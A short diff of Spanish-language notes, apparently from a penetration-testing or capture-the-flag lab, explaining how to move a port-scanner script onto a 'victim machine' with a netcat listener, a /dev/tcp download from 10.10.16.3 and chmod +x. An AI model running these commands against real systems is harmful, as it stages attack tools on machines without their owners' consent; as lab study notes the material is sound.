@@ -1,4 +1,8 @@
 
+#portscannersh 
+
+--------
+
 Nuestra maquina: nc -nlvp 443 < portScanner.sh
 Maquina victima: cat < /dev/tcp/10.10.16.3/443 > portScanner.sh
 Y despues despues desde la maquina victima, darle permiso de ejecucion con chmod +x portScanner.sh
